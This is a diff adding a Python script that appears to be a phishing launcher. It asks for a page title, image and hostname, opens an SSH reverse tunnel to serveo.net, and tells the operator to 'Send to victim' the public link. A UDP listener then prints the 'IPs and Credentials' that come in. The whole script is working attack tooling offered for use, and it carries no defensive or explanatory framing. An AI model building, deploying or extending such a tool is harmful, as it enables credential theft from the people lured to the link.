@@ -1,0 +1,120 @@
+import socketserver , os , threading , time , random , re
+
+class Gr:
+    def __init__(self):
+        self.start()
+        self.Fix_INFO_style()
+        os.system('ssh -o ServerAliveInterval=60 -R %s:80:localhost:1972 serveo.net 2> /dev/null > data'%self.hostname)
+
+    def Fix_INFO_style(self):
+        t = time.sleep
+        print(self.Colors('\n\nY#[W#*Y#] Fix Info.....\n'))
+        t(1)
+        print(self.Colors('G#[+] title: %s'%str(self.FixInfo()[0])))
+        t(1)
+        print(self.Colors('G#[+] image: %s'%str(self.FixInfo()[1])))
+        t(1)
+        print(self.Colors('G#[+] text: %s'%str(self.FixInfo()[2])))
+        t(1)
+        print(self.Colors('G#[+] hostname: %s'%str(self.FixInfo()[3])))
+        t(2)
+        print('\n\033[1;32m[\033[1;37m*\033[1;32m] Starting localhost server...')
+        t(1)
+        print('\033[1;32m[\033[1;37m*\033[1;32m] Starting ssh server...')
+        t(3)
+        print('[\033[1;37m*\033[1;32m] Starting server...')
+        t(2)
+        print('\n\033[1;33m[\033[1;37m*\033[1;33m] Send to victim: \033[1;36mhttps://'+self.hostname+'.serveo.net')
+        print('\n\n\033[1;32m[\033[1;37m*\033[1;32m] Waiting IPs and Credentials, \033[1;37mPress Ctrl + C to exit...')
+
+
+    def Colors(self, text):
+        # ### color ### #
+        text = text.replace('W#', '\033[1;37m')
+        text = text.replace('BL#', '\033[1;30m')
+        text = text.replace('R#', '\033[1;31m')
+        text = text.replace('G#', '\033[1;32m')
+        text = text.replace('Y#', '\033[1;33m')
+        text = text.replace('B#', '\033[1;34m')
+        text = text.replace('P#', '\033[1;35m')
+        text = text.replace('C#', '\033[1;36m')
+        text = text.replace('True','\033[1;36mTrue')
+        text = text.replace('False','\033[1;31mFalse')
+        return text
+
+    def Info(self):
+        self.title = input(self.Colors('G#[W#*G#] title :W# '))
+        self.image = input(self.Colors('G#[W#*G#] path_image :W# '))
+        self.h1 = input(self.Colors('G#[W#*G#] text :W# '))
+        self.hostname = input(self.Colors('G#[W#*G#] hostname :W# ')).lower().replace(' ','')
+
+    def FixImage(self):
+        if os.path.isfile(self.image) == False:
+            return False
+        else:
+            image_name = self.image.split('/')[-1]
+            path = os.getcwd()
+            os.system('rm static/image.jpg 2> /dev/null > data')
+            os.system('cp {} {} 2> /dev/null > data'.format(self.image,path+'/static/image.jpg'))
+            return True
+
+    def FixInfo(self):
+        Fix = re.match
+        if self.title:
+            if Fix('^\w*$',self.title) != None:
+                Title = True
+            else:
+                Title = False
+        if self.hostname:
+            if Fix('^\w*$',self.hostname) != None:
+                Host = True
+            else:
+                Host = False
+
+        return [Title,self.FixImage(),True,Host]
+
+    def read_DATA(self):
+        with open('DATA-s','r') as x:
+            return x.read()
+    def save_DATA(self,DATA,ss):
+        with open('DATA-s',ss) as x:
+            x.write('\n'+DATA)
+
+    def start(self):
+        self.Info()
+        self.FixInfo()
+        if self.FixInfo()[0] == True:
+            self.save_DATA('#%s'%self.title,'w')
+        else:
+            self.title = 'Error 404'
+            self.save_DATA('#%s'%self.title,'w')
+
+        if self.FixInfo()[1] == True:
+            pass
+        else:
+            pass
+        if self.h1:
+            self.save_DATA('#%s'%self.h1,'a')
+        if self.FixInfo()[3] == True:
+            pass
+        else:
+            NumderHost = random.randint(10000,99999)
+            self.hostname = 'error-404-%s'%str(NumderHost)
+
+class MyUDPHandler(socketserver.BaseRequestHandler):
+    def handle(self):
+        data = self.request[0].strip()
+        socket = self.request[1]
+        print(data.decode('utf-8'))
+
+def LISTEN():
+    with socketserver.UDPServer((HOST, PORT), MyUDPHandler) as server:
+        server.serve_forever()
+if __name__ == "__main__":
+    try:
+        HOST, PORT = "localhost", 1972
+        threading.Thread(target=Gr).start()
+        threading.Thread(target=LISTEN).start()
+        os.system('python3 app 2> /dev/null > data')
+    except KeyboardInterrupt:
+        exit()
